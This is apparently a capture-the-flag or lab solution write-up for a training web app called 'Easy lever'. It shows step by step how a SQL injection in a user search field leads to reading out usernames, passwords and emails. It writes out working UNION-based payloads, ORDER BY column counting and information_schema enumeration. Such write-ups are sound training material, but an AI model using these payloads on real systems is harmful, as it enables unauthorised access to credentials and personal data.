## Easy lever
### Mission
Read user and pw now

### Hint
Search it!!!

### Approach
Watch the web!

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/1.jpg" width="666px">
</p>

Hint is search function

We try a few values as: 1, m, minh, ..

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/2.jpg" width="666px">
</p>

*This function is search for users by the user's name.*

Now i try many basic payload of SQL injection `' " --` as `minh', minh", minh' or 1=1--,..`

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/3.jpg" width="666px">
</p>

*Watch the result! The payload `minh' or 1=1--` was inserted successfully*

I use ORDER BY clause to determine the number of columns

```sql
minh' ORDER BY 1--
minh' ORDER BY 1,2--
minh' ORDER BY 1,2,3--
..
```

*The result stops at `minh' ORDER BY 1,2,3,4,5,6--`. So the number of columns in this table is 5*

Next i use UNION clause to SELECT values, i try `minh' UNION SELECT '1','2','3','4','5'--` to check which column the value returns

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/4.png" width="666px">
</p>

Okay, the value returns at column 1,2,3,4

I check the type of database this web use

```sql
SELECT banner FROM v$version
SELECT version FROM v$instance
SELECT @@version
SELECT version()
```

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/5.png" width="666px">
</p>

From the result, i see the type of database is PostgreSQL

I use information_schema.tables to search the name of tables need exploit

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/6.png" width="666px">
</p>

`minh' UNION SELECT table_name,'2','3','4','5' FROM information_schema.tables--`

There is a importain table: **user**

Search all columns of user table - use information_schema.columns

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/7.png" width="666px">
</p>

try `minh' UNION SELECT column_name,'2','3','4','5' FROM information_schema.columns WHERE table_name='user'--`

Oh! username-password-email, are all important information need exploit

Now just read it out, i use String concatenation to make it easier to see

<p align="center">
<img src="https://github.com/pentest-khoa-02/Group1/blob/solution/solution/SQL%20Injection/images/8.png" width="666px">
</p>

**The payload is `minh' UNION SELECT username||';'||password||';'||email,'2','3','4','5' FROM "user"--`**